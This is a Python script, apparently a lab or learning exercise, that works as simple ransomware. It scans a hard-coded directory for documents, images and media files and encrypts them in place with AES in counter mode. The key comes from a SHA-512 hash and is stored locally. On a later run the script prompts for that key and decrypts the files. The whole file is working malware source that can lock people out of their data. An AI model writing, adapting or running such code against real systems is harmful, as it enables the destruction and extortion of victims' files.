import os, random, hashlib, socket
from Crypto.Util import Counter
from Crypto.Cipher import AES

# username = os.getlogin()
destination = r'/home/cybersleuth/ransomware_dir'
#destination = os.path.abspath('')
files = os.listdir(destination)
print(files)
files = [x for x in files if not x.startswith('.')]

extensions = [".txt", ".jpg", '.jpeg', '.mp4', '.mp3', '.png', '.docx', '.doc','.pdf']


def hash_key():
    hashnumber = destination + socket.gethostname() + str(random.randint(0,
                                                                        10000000000000000000000000000000000000000000000))
    hashnumber = hashnumber.encode('utf-8')
    hashnumber = hashlib.sha512(hashnumber)
    hashnumber = hashnumber.hexdigest()
    new_key = []
    for k in hashnumber:
        if len(new_key) == 32:
            hashnumber = ''.join(new_key)
            break
        else:
            new_key.append(k)


    return hashnumber

def encrypt_decrypt(text, crypto, block_size = 16):
    with open(text, 'r+b') as encrypted_file:
        unencrypted_content = encrypted_file.read(block_size)
        while unencrypted_content:
            encrypted_content = crypto(unencrypted_content)
            if len(unencrypted_content) != len(encrypted_content):
                raise ValueError('')
            encrypted_file.seek(- len(unencrypted_content), 1)
            encrypted_file.write(encrypted_content)
            unencrypted_content = encrypted_file.read(block_size)


def discover(key):
    files_list = open('files_list', 'w+')

    for extension in extensions:
        for file in files:
            if file.endswith(extension):
                files_list.write(destination + '/' + os.path.join(file)+ '\n')
    files_list.close()

    del_space = open('files_list', 'r')
    del_space = del_space.read().split('\n')
    del_space = [i for i in del_space if not i == '']

    if os.path.exists('hash_file'):
        decrypt_field = input('Enter the symmetric key: ')
        hash_file = open('hash_file', 'r')
        key = hash_file.read().split('\n')
        key = ''.join(key)
        if decrypt_field == key:
            key = key.encode('utf-8')
            counter = Counter.new(128)
            crypto = AES.new(key, AES.MODE_CTR, counter = counter)
            cryp_files = crypto.decrypt
            for element in del_space:
                encrypt_decrypt(element, cryp_files)
    else:
        counter = Counter.new(128)
        crypto = AES.new(key, AES.MODE_CTR, counter = counter)
        hash_file = open('hash_file', 'wb')
        hash_file.write(key)
        hash_file.close()
        cryp_files = crypto.encrypt
        for element in del_space:
            encrypt_decrypt(element, cryp_files)

def main():
    hashnumber = hash_key()
    hashnumber = hashnumber.encode('utf-8')
    discover(hashnumber)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
